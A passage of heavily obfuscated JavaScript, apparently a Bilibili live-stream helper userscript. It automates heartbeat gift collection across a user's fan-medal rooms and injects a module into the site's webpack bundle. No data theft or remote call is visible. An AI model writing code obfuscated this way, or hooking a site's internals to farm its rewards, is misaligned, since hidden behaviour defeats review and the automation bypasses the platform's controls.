BiliPushUtils['\x41\x50\x49'][_0x52b8('50','\x61\x44\x73\x29')][_0x52b8('51','\x2a\x47\x64\x5e')](_0x15ea12);if(_0x5b1003['\x66\x4b\x59\x65\x5a'](_0x2ca90e['\x63\x6f\x64\x65'],0x0)){++HeartGift[_0x52b8('52','\x66\x47\x4f\x5b')];++this[_0x52b8('53','\x46\x4b\x78\x79')];this[_0x52b8('54','\x32\x4b\x4d\x68')]=_0x2ca90e[_0x52b8('55','\x71\x41\x46\x73')]['\x68\x65\x61\x72\x74\x62\x65\x61\x74\x5f\x69\x6e\x74\x65\x72\x76\x61\x6c'];this['\x62\x65\x6e\x63\x68\x6d\x61\x72\x6b']=_0x2ca90e['\x64\x61\x74\x61'][_0x52b8('56','\x5d\x47\x45\x51')];this[_0x52b8('57','\x29\x7a\x73\x5b')]=_0x2ca90e[_0x52b8('58','\x38\x50\x71\x53')][_0x52b8('59','\x33\x77\x24\x77')];this['\x73\x65\x63\x72\x65\x74\x5f\x72\x75\x6c\x65']=_0x2ca90e[_0x52b8('5a','\x56\x74\x75\x5b')][_0x52b8('5b','\x55\x63\x50\x2a')];if(_0x5b1003[_0x52b8('5c','\x34\x6f\x33\x70')](HeartGift[_0x52b8('52','\x66\x47\x4f\x5b')],HeartGift[_0x52b8('5d','\x59\x73\x7a\x26')])&&HeartGift[_0x52b8('5e','\x52\x6e\x61\x4a')]){if(_0x5b1003[_0x52b8('5f','\x21\x50\x6b\x42')](_0x5b1003[_0x52b8('60','\x70\x66\x40\x6e')],_0x5b1003[_0x52b8('61','\x42\x79\x6b\x23')])){for(var _0x3d30ed=e[_0x52b8('62','\x2a\x47\x64\x5e')],_0x545676=0x0;_0x5b1003[_0x52b8('63','\x67\x56\x57\x47')](_0x545676,r[_0x52b8('64','\x5d\x47\x45\x51')]);++_0x545676){var _0x1dc7f9=r['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x545676);_0x5b1003['\x78\x54\x73\x57\x48'](_0x1dc7f9,0xd800)&&_0x5b1003[_0x52b8('65','\x52\x6e\x61\x4a')](_0x1dc7f9,0xdfff)&&(_0x1dc7f9=_0x5b1003[_0x52b8('66','\x70\x59\x54\x65')](_0x5b1003['\x62\x65\x78\x6f\x41'](0x10000,_0x5b1003[_0x52b8('67','\x47\x38\x41\x23')](_0x5b1003[_0x52b8('68','\x67\x56\x57\x47')](0x3ff,_0x1dc7f9),0xa)),_0x5b1003[_0x52b8('69','\x47\x38\x41\x23')](0x3ff,r[_0x52b8('6a','\x47\x38\x41\x23')](++_0x545676)))),_0x5b1003[_0x52b8('6b','\x49\x43\x28\x41')](_0x1dc7f9,0x7f)?_0x3d30ed[t++]=_0x1dc7f9:_0x5b1003['\x55\x61\x64\x52\x79'](_0x1dc7f9,0x7ff)?(_0x3d30ed[t++]=_0x5b1003[_0x52b8('6c','\x46\x4b\x78\x79')](0xc0,_0x5b1003[_0x52b8('6d','\x64\x5e\x23\x6e')](_0x1dc7f9,0x6)),_0x3d30ed[t++]=_0x5b1003[_0x52b8('6e','\x42\x79\x6b\x23')](0x80,_0x5b1003[_0x52b8('6f','\x47\x38\x41\x23')](0x3f,_0x1dc7f9))):_0x5b1003[_0x52b8('6b','\x49\x43\x28\x41')](_0x1dc7f9,0xffff)?(_0x3d30ed[t++]=_0x5b1003[_0x52b8('70','\x70\x77\x62\x54')](0xe0,_0x5b1003[_0x52b8('71','\x66\x47\x4f\x5b')](_0x1dc7f9,0xc)),_0x3d30ed[t++]=_0x5b1003['\x6e\x54\x48\x61\x53'](0x80,_0x5b1003['\x43\x6a\x4b\x70\x62'](_0x5b1003[_0x52b8('72','\x21\x50\x6b\x42')](_0x1dc7f9,0x6),0x3f)),_0x3d30ed[t++]=_0x5b1003[_0x52b8('73','\x66\x47\x4f\x5b')](0x80,_0x5b1003['\x43\x6a\x4b\x70\x62'](0x3f,_0x1dc7f9))):_0x5b1003['\x55\x61\x64\x52\x79'](_0x1dc7f9,0x1fffff)?(_0x3d30ed[t++]=_0x5b1003[_0x52b8('74','\x2a\x38\x4d\x52')](0xf0,_0x5b1003[_0x52b8('75','\x67\x26\x4d\x4e')](_0x1dc7f9,0x12)),_0x3d30ed[t++]=_0x5b1003['\x77\x4b\x4f\x73\x71'](0x80,_0x5b1003['\x61\x63\x6b\x6f\x4d'](_0x5b1003[_0x52b8('76','\x38\x30\x74\x63')](_0x1dc7f9,0xc),0x3f)),_0x3d30ed[t++]=_0x5b1003['\x6b\x48\x6d\x75\x4e'](0x80,_0x5b1003[_0x52b8('77','\x67\x56\x57\x47')](_0x5b1003[_0x52b8('78','\x5d\x63\x5a\x66')](_0x1dc7f9,0x6),0x3f)),_0x3d30ed[t++]=_0x5b1003[_0x52b8('79','\x56\x74\x75\x5b')](0x80,_0x5b1003['\x61\x63\x6b\x6f\x4d'](0x3f,_0x1dc7f9))):_0x5b1003[_0x52b8('7a','\x29\x7a\x73\x5b')](_0x1dc7f9,0x3ffffff)?(_0x3d30ed[t++]=_0x5b1003[_0x52b8('7b','\x75\x40\x21\x64')](0xf8,_0x5b1003[_0x52b8('7c','\x52\x6e\x61\x4a')](_0x1dc7f9,0x18)),_0x3d30ed[t++]=_0x5b1003[_0x52b8('7d','\x25\x28\x75\x71')](0x80,_0x5b1003[_0x52b8('7e','\x76\x46\x41\x68')](_0x5b1003[_0x52b8('7f','\x5e\x41\x36\x4b')](_0x1dc7f9,0x12),0x3f)),_0x3d30ed[t++]=_0x5b1003[_0x52b8('80','\x5d\x47\x45\x51')](0x80,_0x5b1003['\x71\x53\x56\x55\x66'](_0x5b1003[_0x52b8('81','\x2a\x38\x4d\x52')](_0x1dc7f9,0xc),0x3f)),_0x3d30ed[t++]=_0x5b1003[_0x52b8('82','\x58\x24\x25\x73')](0x80,_0x5b1003[_0x52b8('83','\x64\x44\x63\x54')](_0x5b1003['\x4e\x41\x6f\x58\x77'](_0x1dc7f9,0x6),0x3f)),_0x3d30ed[t++]=_0x5b1003[_0x52b8('84','\x76\x46\x41\x68')](0x80,_0x5b1003[_0x52b8('85','\x28\x25\x25\x25')](0x3f,_0x1dc7f9))):(_0x3d30ed[t++]=_0x5b1003[_0x52b8('86','\x25\x28\x75\x71')](0xfc,_0x5b1003[_0x52b8('87','\x6b\x6f\x29\x50')](_0x1dc7f9,0x1e)),_0x3d30ed[t++]=_0x5b1003[_0x52b8('88','\x70\x59\x54\x65')](0x80,_0x5b1003[_0x52b8('89','\x45\x31\x29\x5e')](_0x5b1003['\x53\x48\x57\x46\x4c'](_0x1dc7f9,0x18),0x3f)),_0x3d30ed[t++]=_0x5b1003[_0x52b8('8a','\x2a\x47\x64\x5e')](0x80,_0x5b1003['\x46\x70\x43\x58\x6b'](_0x5b1003[_0x52b8('8b','\x61\x44\x73\x29')](_0x1dc7f9,0x12),0x3f)),_0x3d30ed[t++]=_0x5b1003[_0x52b8('8c','\x5d\x47\x45\x51')](0x80,_0x5b1003['\x46\x70\x43\x58\x6b'](_0x5b1003[_0x52b8('8d','\x64\x44\x63\x54')](_0x1dc7f9,0xc),0x3f)),_0x3d30ed[t++]=_0x5b1003[_0x52b8('8e','\x56\x24\x55\x57')](0x80,_0x5b1003[_0x52b8('8f','\x70\x58\x38\x32')](_0x5b1003[_0x52b8('90','\x2a\x38\x4d\x52')](_0x1dc7f9,0x6),0x3f)),_0x3d30ed[t++]=_0x5b1003['\x77\x48\x62\x74\x6a'](0x80,_0x5b1003['\x4e\x71\x64\x77\x6c'](0x3f,_0x1dc7f9)));}}else{await _0x5b1003['\x6f\x41\x73\x6a\x7a'](delayCall,()=>this[_0x52b8('91','\x28\x64\x70\x75')](),_0x5b1003['\x57\x55\x57\x6a\x59'](this['\x74\x69\x6d\x65'],0x3e8));}}else{if(_0x5b1003[_0x52b8('92','\x55\x4e\x45\x6d')](_0x5b1003['\x67\x66\x62\x4f\x6c'],_0x5b1003['\x76\x42\x43\x4e\x45'])){delete e[_0x52b8('93','\x54\x29\x5b\x45')][_0x52b8('94','\x70\x66\x40\x6e')][r];}else{if(HeartGift[_0x52b8('95','\x76\x46\x41\x68')]){console[_0x52b8('96','\x70\x58\x38\x32')](_0x52b8('97','\x49\x43\x28\x41'));HeartGift[_0x52b8('98','\x42\x79\x6b\x23')]=![];_0x5b1003[_0x52b8('99','\x49\x43\x28\x41')](runTomorrow,HeartGift[_0x52b8('9a','\x32\x4b\x4d\x68')]);}}}}}}catch(_0x37305c){this['\x65\x72\x72\x6f\x72']++;console[_0x52b8('9b','\x6b\x6f\x29\x50')](_0x37305c);await _0x5b1003['\x6a\x76\x6d\x73\x70'](delayCall,()=>this['\x68\x65\x61\x72\x74\x50\x72\x6f\x63\x65\x73\x73'](),0x3e8);}}}const HeartGift={'\x74\x6f\x74\x61\x6c':0x0,'\x6d\x61\x78':0x19,'\x70\x72\x6f\x63\x65\x73\x73':!![],'\x72\x75\x6e':async()=>{var _0x2f7dbe={'\x49\x4a\x47\x56\x55':function(_0x13de51,_0xd788fd){return _0x13de51>_0xd788fd;},'\x66\x5a\x6a\x4a\x44':_0x52b8('9c','\x61\x44\x73\x29'),'\x52\x79\x67\x64\x66':function(_0x4f19da,_0x37d948){return _0x4f19da==_0x37d948;},'\x78\x61\x42\x64\x4e':function(_0x1447b6,_0x203285,_0x366abd){return _0x1447b6(_0x203285,_0x366abd);},'\x57\x4a\x59\x45\x6f':function(_0x1d8c00,_0x4cf101,_0x804cb5){return _0x1d8c00(_0x4cf101,_0x804cb5);},'\x52\x69\x44\x61\x58':function(_0x3cdb98,_0x4990ff){return _0x3cdb98==_0x4990ff;}};if(!HeartGift['\x70\x72\x6f\x63\x65\x73\x73']){HeartGift[_0x52b8('9d','\x61\x44\x73\x29')]=0x0;HeartGift['\x70\x72\x6f\x63\x65\x73\x73']=!![];}let _0x5776f6=await Gift['\x67\x65\x74\x4d\x65\x64\x61\x6c\x4c\x69\x73\x74']();if(_0x5776f6&&_0x2f7dbe['\x49\x4a\x47\x56\x55'](_0x5776f6[_0x52b8('9e','\x45\x31\x29\x5e')],0x0)){console['\x6c\x6f\x67'](_0x2f7dbe['\x66\x5a\x6a\x4a\x44']);while(_0x2f7dbe[_0x52b8('9f','\x6b\x6f\x29\x50')](BiliPushUtils['\x73\x69\x67\x6e'],null)){await _0x2f7dbe[_0x52b8('a0','\x5d\x63\x5a\x66')](delayCall,()=>{},0x3e8);}for(let _0x5b5ec2 of _0x5776f6){let _0x10a3b5=await API[_0x52b8('a1','\x64\x5e\x23\x6e')][_0x52b8('a2','\x76\x46\x41\x68')](_0x2f7dbe[_0x52b8('a3','\x56\x24\x55\x57')](parseInt,_0x5b5ec2['\x72\x6f\x6f\x6d\x69\x64'],0xa));if(_0x2f7dbe[_0x52b8('a4','\x29\x7a\x73\x5b')](_0x10a3b5['\x63\x6f\x64\x65'],0x0)){console[_0x52b8('a5','\x5d\x47\x45\x51')](_0x52b8('a6','\x25\x28\x75\x71')+_0x5b5ec2['\x6d\x65\x64\x61\x6c\x4e\x61\x6d\x65']+_0x52b8('a7','\x6b\x6f\x29\x50')+_0x10a3b5['\x64\x61\x74\x61'][_0x52b8('a8','\x62\x62\x29\x6a')]+_0x52b8('a9','\x2a\x38\x4d\x52'));new HeartGiftRoom(_0x10a3b5['\x64\x61\x74\x61']);await _0x2f7dbe[_0x52b8('aa','\x31\x31\x78\x6c')](delayCall,()=>{},0x3e8);}}}}};(window[_0x52b8('ab','\x62\x62\x29\x6a')]=window['\x77\x65\x62\x70\x61\x63\x6b\x4a\x73\x6f\x6e\x70']||[])[_0x52b8('ac','\x62\x62\x29\x6a')]([[0x2e],{2205:function(_0x545cf2,_0x4bdd4c,_0x58c2e1){var _0x47ead8={'\x69\x74\x6c\x67\x4a':function(_0x11361b,_0x31b8b0){return _0x11361b===_0x31b8b0;},'\x5a\x55\x56\x48\x54':function(_0x206b72,_0x4449ab){return _0x206b72 in _0x4449ab;},'\x6f\x67\x5a\x74\x69':function(_0x1761da,_0x3d3af4){return _0x1761da/_0x3d3af4;},'\x4c\x6b\x71\x62\x43':function(_0x3ae998,_0x2bb103){return _0x3ae998+_0x2bb103;},'\x72\x69\x66\x47\x42':function(_0x40121c,_0x42ba1a){return _0x40121c*_0x42ba1a;},'\x51\x67\x54\x6d\x41':function(_0xfd3a5d,_0x56a0ed){return _0xfd3a5d/_0x56a0ed;},'\x50\x62\x50\x64\x7a':function(_0xb051ee,_0x11284d){return _0xb051ee+_0x11284d;},'\x53\x6f\x46\x4c\x68':function(_0x55e4f3,_0x1628cf){return _0x55e4f3!==_0x1628cf;},'\x57\x67\x67\x51\x46':'\x52\x4b\x6c\x59\x71','\x68\x6a\x4e\x59\x63':function(_0x38d6ae,_0x5242d5){return _0x38d6ae!=_0x5242d5;},'\x64\x57\x75\x4e\x72':function(_0x59b749,_0xe4b8d9){return _0x59b749===_0xe4b8d9;},'\x71\x67\x4a\x67\x77':function(_0x472da9,_0x2f11ad){return _0x472da9/_0x2f11ad;},'\x4f\x51\x4d\x44\x41':function(_0x2ebd3d,_0x273308){return _0x2ebd3d/_0x273308;},'\x4e\x59\x61\x49\x67':_0x52b8('ad','\x28\x64\x70\x75'),'\x77\x4b\x41\x7a\x58':'\x7a\x67\x63\x43\x51','\x56\x50\x52\x61\x53':function(_0x119ee5,_0x38c677){return _0x119ee5/_0x38c677;},'\x58\x64\x6e\x6c\x68':function(_0x4c2a21,_0xc353d8){return _0x4c2a21+_0xc353d8;},'\x75\x77\x62\x7a\x7a':function(_0x49848b,_0x2b0c55){return _0x49848b===_0x2b0c55;},'\x6a\x75\x41\x78\x4b':function(_0xd2d468,_0x5ec691){return _0xd2d468===_0x5ec691;},'\x4c\x48\x77\x58\x79':function(_0x44fab9,_0x4b387a){return _0x44fab9+_0x4b387a;},'\x68\x67\x6c\x62\x56':function(_0x54e104,_0x175b81){return _0x54e104/_0x175b81;},'\x42\x43\x7a\x56\x49':function(_0x54a8d4,_0x59a8a1){return _0x54a8d4/_0x59a8a1;},'\x6a\x49\x47\x67\x74':function(_0x133530,_0x2a1e16){return _0x133530<_0x2a1e16;},'\x46\x48\x65\x6a\x61':function(_0x352178,_0x1008cc){return _0x352178*_0x1008cc;},'\x59\x59\x6c\x75\x52':function(_0x4c44b9,_0x2f6d88){return _0x4c44b9+_0x2f6d88;},'\x6f\x6e\x6f\x64\x6a':function(_0x3452b6,_0x3c5524){return _0x3452b6/_0x3c5524;},'\x69\x4a\x49\x42\x6b':function(_0x54d122,_0x5800d3){return _0x54d122/_0x5800d3;},'\x78\x49\x41\x79\x4c':function(_0x406314,_0x3e562f){return _0x406314+_0x3e562f;},'\x51\x6e\x49\x54\x62':function(_0x55d349,_0x13b6e2){return _0x55d349/_0x13b6e2;},'\x67\x41\x76\x6e\x57':function(_0x38494a,_0x269ff9){return _0x38494a+_0x269ff9;},'\x52\x53\x48\x51\x59':function(_0x4f107a,_0x1e7690){return _0x4f107a*_0x1e7690;},'\x54\x74\x4f\x4d\x4c':function(_0x5c0fbf,_0x1a0805){return _0x5c0fbf/_0x1a0805;},'\x69\x69\x67\x53\x77':function(_0x17c336,_0xa9dad6){return _0x17c336+_0xa9dad6;},'\x78\x48\x44\x59\x43':function(_0x32a7f0,_0x15f42e){return _0x32a7f0+_0x15f42e;},'\x68\x70\x66\x61\x4c':function(_0x3fc844,_0x367d6d){return _0x3fc844*_0x367d6d;},'\x4c\x53\x46\x54\x74':function(_0xf393c8,_0x17e96c){return _0xf393c8===_0x17e96c;},'\x6a\x64\x59\x64\x69':function(_0x3e3d20,_0x242120){return _0x3e3d20/_0x242120;},'\x57\x77\x67\x6b\x54':_0x52b8('ae','\x62\x62\x29\x6a'),'\x6f\x74\x4f\x53\x42':_0x52b8('af','\x31\x31\x78\x6c'),'\x7a\x55\x65\x50\x45':function(_0x11a6d7,_0x36245f){return _0x11a6d7+_0x36245f;},'\x6b\x6a\x53\x6f\x61':function(_0x566e50,_0x1cfd72){return _0x566e50/_0x1cfd72;},'\x74\x6f\x4b\x51\x54':function(_0x4d6aac,_0x2d9491){return _0x4d6aac===_0x2d9491;},'\x52\x48\x6f\x46\x43':function(_0x407e19,_0x125239){return _0x407e19+_0x125239;},'\x67\x52\x4e\x58\x69':function(_0x4c1dc3,_0x2a5ce0){return _0x4c1dc3/_0x2a5ce0;},'\x79\x73\x44\x4c\x43':function(_0x5e651a,_0x1ba104){return _0x5e651a/_0x1ba104;},'\x50\x78\x6d\x77\x64':function(_0x5ed4d1){return _0x5ed4d1();},'\x67\x6a\x61\x46\x7a':function(_0x11eb31,_0x2a5f2f){return _0x11eb31*_0x2a5f2f;},'\x4d\x5a\x72\x77\x4d':function(_0x3d311f,_0x1a9345){return _0x3d311f+_0x1a9345;},'\x59\x59\x48\x4b\x4f':function(_0x2cb495,_0x488cd6){return _0x2cb495/_0x488cd6;},'\x45\x41\x59\x55\x47':function(_0x5aa730,_0x2e250e){return _0x5aa730+_0x2e250e;},'\x75\x48\x5a\x58\x4e':function(_0x29c67e,_0x47d080){return _0x29c67e!==_0x47d080;},'\x79\x6e\x73\x45\x56':_0x52b8('b0','\x61\x44\x73\x29'),'\x6d\x74\x56\x59\x4e':'\x58\x4f\x6b\x50\x69','\x6c\x5a\x47\x69\x52':function(_0x3ad17f,_0x55afa8){return _0x3ad17f+_0x55afa8;},'\x4f\x69\x62\x62\x43':function(_0x43d6fa,_0x4d531f){return _0x43d6fa>_0x4d531f;},'\x47\x58\x4c\x70\x4f':function(_0x57c964,_0x1ca672){return _0x57c964/_0x1ca672;},'\x6f\x69\x62\x77\x47':'\x4c\x67\x50\x6f\x50','\x56\x56\x41\x79\x5a':_0x52b8('b1','\x52\x6e\x61\x4a'),'\x70\x58\x45\x42\x7a':function(_0x33cd3b,_0x5e65d5){return _0x33cd3b/_0x5e65d5;},'\x4e\x79\x65\x4f\x76':function(_0x1b9b5b,_0x1987a0){return _0x1b9b5b===_0x1987a0;},'\x73\x66\x56\x71\x52':_0x52b8('b2','\x59\x73\x7a\x26'),'\x4d\x5a\x6e\x63\x6e':'\x42\x46\x5a\x72\x76','\x59\x59\x55\x75\x57':function(_0xeb9741,_0x1ab0c5){return _0xeb9741===_0x1ab0c5;},'\x6d\x68\x6d\x5a\x72':'\x48\x6b\x63\x76\x63','\x72\x45\x79\x59\x71':_0x52b8('b3','\x70\x58\x38\x32'),'\x44\x62\x5a\x78\x73':function(_0x3a88c4,_0x1b9108){return _0x3a88c4 in _0x1b9108;},'\x65\x52\x53\x43\x72':function(_0x544e49,_0x18ddd3){return _0x544e49(_0x18ddd3);},'\x58\x6f\x49\x78\x6f':function(_0x58a3e8,_0x4f1412){return _0x58a3e8(_0x4f1412);},'\x41\x53\x7a\x76\x43':function(_0x4349c0,_0x17d286){return _0x4349c0==_0x17d286;},'\x55\x67\x5a\x63\x49':'\x73\x65\x74','\x6c\x74\x52\x61\x44':function(_0x299da0,_0x2ce1ce){return _0x299da0===_0x2ce1ce;},'\x4f\x66\x67\x7a\x72':_0x52b8('b4','\x28\x64\x70\x75'),'\x6d\x68\x72\x67\x63':_0x52b8('b5','\x45\x31\x29\x5e'),'\x41\x53\x53\x49\x41':function(_0x338abd,_0x1f0f0e){return _0x338abd!==_0x1f0f0e;},'\x6e\x41\x4e\x55\x6a':'\x47\x58\x6b\x7a\x63','\x47\x76\x6f\x76\x6d':_0x52b8('b6','\x54\x29\x5b\x45'),'\x57\x4c\x4e\x78\x67':_0x52b8('b7','\x46\x4b\x78\x79'),'\x68\x6d\x4e\x55\x63':_0x52b8('b8','\x67\x56\x57\x47'),'\x59\x55\x4a\x74\x4e':function(_0x19b815,_0x2556cb){return _0x19b815===_0x2556cb;},'\x67\x6c\x75\x58\x66':_0x52b8('b9','\x21\x50\x6b\x42'),'\x6b\x44\x50\x71\x46':_0x52b8('ba','\x55\x71\x73\x58'),'\x55\x52\x55\x53\x54':function(_0x17071e,_0x4582b2){return _0x17071e!==_0x4582b2;},'\x53\x4a\x6d\x48\x5a':_0x52b8('bb','\x70\x66\x40\x6e'),'\x61\x41\x51\x72\x63':_0x52b8('bc','\x51\x5b\x73\x47'),'\x48\x69\x4b\x67\x43':function(_0x4b223b,_0x19c567){return _0x4b223b<_0x19c567;},'\x41\x50\x4f\x56\x44':function(_0x328755,_0x4a8fdd){return _0x328755>=_0x4a8fdd;},'\x57\x62\x64\x63\x64':function(_0x9f8f93,_0x1175c6){return _0x9f8f93<=_0x1175c6;},'\x77\x59\x48\x4b\x54':function(_0x231fec,_0x5092d8){return _0x231fec|_0x5092d8;},'\x64\x47\x6b\x51\x4b':function(_0x257f59,_0x3ff087){return _0x257f59+_0x3ff087;},'\x6d\x4a\x47\x79\x56':function(_0x252e05,_0x47c0e6){return _0x252e05<<_0x47c0e6;},'\x50\x41\x4a\x5a\x77':function(_0x5cd0b7,_0x56fc7f){return _0x5cd0b7&_0x56fc7f;},'\x51\x75\x4a\x66\x51':function(_0x283dbe,_0x30f0a5){return _0x283dbe<=_0x30f0a5;},'\x59\x4a\x65\x4f\x6a':function(_0x4990ae,_0x36b3a7){return _0x4990ae<=_0x36b3a7;},'\x4c\x54\x4d\x57\x66':function(_0x7c86ce,_0x36afc1){return _0x7c86ce<=_0x36afc1;},'\x41\x79\x51\x72\x71':function(_0x3334b6,_0x16bfa6){return _0x3334b6<=_0x16bfa6;},'\x78\x51\x4e\x74\x46':function(_0x2ed78f,_0x431996){return _0x2ed78f|_0x431996;},'\x62\x6a\x4f\x43\x46':function(_0x2a0d66,_0x109bb1){return _0x2a0d66 instanceof _0x109bb1;},'\x58\x70\x59\x61\x50':function(_0x15ae5b,_0x46a459){return _0x15ae5b!==_0x46a459;},'\x4f\x42\x55\x5a\x4b':'\x51\x79\x6a\x4b\x42','\x66\x79\x72\x63\x51':_0x52b8('bd','\x64\x44\x63\x54'),'\x4c\x59\x6d\x4a\x59':function(_0x28de7a,_0x6edb67){return _0x28de7a instanceof _0x6edb67;},'\x55\x55\x6f\x70\x6d':function(_0x2e46ea,_0x55f65c){return _0x2e46ea===_0x55f65c;},'\x67\x67\x4f\x69\x47':_0x52b8('be','\x65\x34\x59\x79'),'\x56\x73\x6e\x78\x57':function(_0x7df1a6,_0x47d861,_0x1b51fe){return _0x7df1a6(_0x47d861,_0x1b51fe);},'\x45\x47\x48\x6e\x44':function(_0x411246,_0x5d36a7,_0x52c0c2){return _0x411246(_0x5d36a7,_0x52c0c2);},'\x56\x65\x59\x70\x48':function(_0x1edf16,_0x201916){return _0x1edf16===_0x201916;},'\x6b\x69\x59\x61\x57':_0x52b8('bf','\x6b\x6f\x29\x50'),'\x50\x55\x50\x42\x67':_0x52b8('c0','\x52\x6e\x61\x4a'),'\x6d\x6d\x4b\x68\x59':function(_0x425d01,_0x234c0f){return _0x425d01/_0x234c0f;},'\x4b\x48\x76\x4f\x59':function(_0x331f4c,_0x449678){return _0x331f4c+_0x449678;},'\x68\x58\x6f\x49\x55':function(_0x4c7f8f,_0x2c95e5){return _0x4c7f8f+_0x2c95e5;},'\x56\x6b\x50\x4b\x68':function(_0x37402a,_0x543666){return _0x37402a===_0x543666;},'\x79\x71\x6b\x6e\x6e':function(_0x3eae13,_0x8816f1){return _0x3eae13+_0x8816f1;},'\x50\x58\x4a\x6b\x48':_0x52b8('c1','\x55\x71\x73\x58'),'\x49\x58\x4b\x43\x57':_0x52b8('c2','\x5d\x63\x5a\x66'),'\x74\x7a\x56\x52\x73':_0x52b8('c3','\x76\x46\x41\x68'),'\x75\x68\x74\x4a\x75':_0x52b8('c4','\x40\x25\x53\x76'),'\x54\x41\x65\x74\x7a':_0x52b8('c5','\x38\x30\x74\x63'),'\x54\x55\x69\x56\x59':'\x77\x65\x62\x5f\x66\x72\x65\x65','\x45\x46\x62\x69\x42':_0x52b8('c6','\x6b\x6f\x29\x50'),'\x48\x78\x7a\x55\x4c':function(_0x4bd8a4,_0x9a682f){return _0x4bd8a4|_0x9a682f;},'\x66\x4d\x64\x79\x67':function(_0x1ea01b,_0x446741){return _0x1ea01b+_0x446741;},'\x49\x63\x73\x70\x42':function(_0x4b7b24,_0x208935){return _0x4b7b24<<_0x208935;},'\x48\x47\x58\x73\x4c':function(_0xc492,_0x53456a){return _0xc492&_0x53456a;},'\x76\x41\x50\x4d\x68':function(_0x194679,_0x357dd7){return _0x194679|_0x357dd7;},'\x70\x6e\x55\x47\x7a':function(_0x23d61f,_0x3ed47f){return _0x23d61f>>_0x3ed47f;},'\x53\x58\x78\x62\x53':function(_0x1f2c06,_0x18806d){return _0x1f2c06|_0x18806d;},'\x6f\x56\x6b\x71\x66':function(_0x1cae57,_0x20d2e3){return _0x1cae57>>_0x20d2e3;},'\x53\x51\x42\x69\x51':function(_0x25d9ab,_0x39e236){return _0x25d9ab|_0x39e236;},'\x61\x41\x57\x6c\x64':function(_0x385cac,_0xf9be3b){return _0x385cac<=_0xf9be3b;},'\x4e\x75\x64\x79\x72':function(_0x480829,_0x25e955){return _0x480829|_0x25e955;},'\x4b\x43\x61\x69\x4e':function(_0x44597d,_0x567a74){return _0x44597d>>_0x567a74;},'\x63\x6e\x7a\x62\x72':function(_0x612597,_0xcd5082){return _0x612597&_0xcd5082;},'\x6f\x43\x43\x52\x79':function(_0x7b0768,_0x27f18a){return _0x7b0768|_0x27f18a;},'\x69\x6e\x54\x43\x79':function(_0x2b1ba4,_0x2fef15){return _0x2b1ba4&_0x2fef15;},'\x6d\x61\x46\x42\x7a':function(_0x5d1346,_0x5ed21f){return _0x5d1346>>_0x5ed21f;},'\x4d\x50\x55\x4a\x70':function(_0x116e7f,_0x1220a9){return _0x116e7f>>_0x1220a9;},'\x69\x54\x71\x62\x66':function(_0x346533,_0xdb419b){return _0x346533|_0xdb419b;},'\x71\x44\x6d\x7a\x42':function(_0xc38573,_0x4bef15){return _0xc38573|_0x4bef15;},'\x44\x54\x4b\x75\x6f':function(_0x23b1dd,_0x51b825){return _0x23b1dd|_0x51b825;},'\x73\x75\x4d\x78\x76':function(_0x558102,_0x4c7ffa){return _0x558102&_0x4c7ffa;},'\x48\x46\x6b\x5a\x72':function(_0x3ce644,_0x3314d7){return _0x3ce644|_0x3314d7;},'\x62\x6c\x61\x65\x50':function(_0x56ada9,_0x1ad4aa){return _0x56ada9===_0x1ad4aa;},'\x6b\x65\x7a\x4f\x6c':function(_0xf5cf7d,_0x5b9fc9){return _0xf5cf7d===_0x5b9fc9;},'\x7a\x57\x70\x75\x41':_0x52b8('c7','\x70\x58\x38\x32'),'\x54\x61\x61\x44\x69':'\x48\x6d\x59\x4e\x72','\x51\x44\x59\x4f\x59':function(_0x2027de,_0x4190f6){return _0x2027de===_0x4190f6;},'\x64\x7a\x49\x46\x63':function(_0x55c222,_0x4ecd44){return _0x55c222===_0x4ecd44;},'\x4d\x77\x71\x6d\x6f':_0x52b8('c8','\x61\x44\x73\x29'),'\x7a\x74\x4d\x78\x4b':_0x52b8('c9','\x70\x59\x54\x65'),'\x5a\x64\x52\x6f\x4c':_0x52b8('ca','\x64\x44\x63\x54'),'\x59\x56\x79\x53\x74':function(_0x10f429,_0x5c903b){return _0x10f429===_0x5c903b;},'\x46\x4e\x45\x67\x47':_0x52b8('cb','\x66\x47\x4f\x5b'),'\x43\x4a\x74\x68\x4a':'\x4a\x74\x44\x4c\x69','\x46\x7a\x52\x6e\x6d':_0x52b8('cc','\x5d\x63\x5a\x66'),'\x4b\x69\x62\x66\x70':_0x52b8('cd','\x70\x66\x40\x6e'),'\x76\x4f\x61\x69\x69':_0x52b8('ce','\x47\x38\x41\x23'),'\x69\x79\x44\x54\x48':function(_0x2ba1bc,_0x4acefe){return _0x2ba1bc/_0x4acefe;},'\x6e\x70\x42\x69\x4a':function(_0x77c25f,_0x49c52e){return _0x77c25f<_0x49c52e;},'\x58\x78\x6b\x65\x4b':function(_0x431da9,_0x44a909){return _0x431da9===_0x44a909;},'\x75\x62\x5a\x74\x53':function(_0x38161b,_0x5a6f48){return _0x38161b===_0x5a6f48;},'\x69\x65\x48\x77\x44':function(_0x154854,_0x5e3fe5){return _0x154854/_0x5e3fe5;},'\x77\x62\x71\x77\x75':function(_0x47f69d,_0xbd2800){return _0x47f69d===_0xbd2800;},'\x79\x43\x42\x6f\x5a':function(_0x422569,_0x469081){return _0x422569===_0x469081;},'\x70\x6b\x45\x67\x4d':function(_0x43458a,_0x25548d){return _0x43458a+_0x25548d;},'\x44\x50\x56\x4a\x48':function(_0x2315b6,_0x230354){return _0x2315b6+_0x230354;},'\x68\x57\x73\x54\x4f':function(_0x540d9a,_0x2ed80e){return _0x540d9a/_0x2ed80e;},'\x72\x41\x6e\x4f\x6d':function(_0x5e92a1,_0x1665f7){return _0x5e92a1/_0x1665f7;},'\x61\x63\x70\x79\x76':function(_0x18da0d,_0x109e4b){return _0x18da0d/_0x109e4b;},'\x56\x5a\x5a\x78\x73':function(_0x1e09c3,_0x536dc4){return _0x1e09c3+_0x536dc4;},'\x65\x4f\x55\x49\x52':function(_0x2d5f40,_0x532014){return _0x2d5f40<_0x532014;},'\x55\x45\x70\x4e\x52':function(_0x4b96a6,_0x2a21df){return _0x4b96a6&_0x2a21df;},'\x41\x57\x43\x6d\x4e':function(_0x1ff29b,_0x2f2a55){return _0x1ff29b>=_0x2f2a55;},'\x66\x5a\x74\x58\x66':_0x52b8('cf','\x59\x73\x7a\x26'),'\x5a\x78\x73\x61\x68':_0x52b8('d0','\x62\x62\x29\x6a'),'\x6a\x6a\x45\x52\x58':'\x6a\x6c\x6f\x6b\x75','\x43\x4b\x4a\x73\x4b':function(_0x42d546,_0x46ff4a){return _0x42d546<_0x46ff4a;},'\x4d\x46\x57\x51\x74':function(_0x3fa4df,_0x777eaa){return 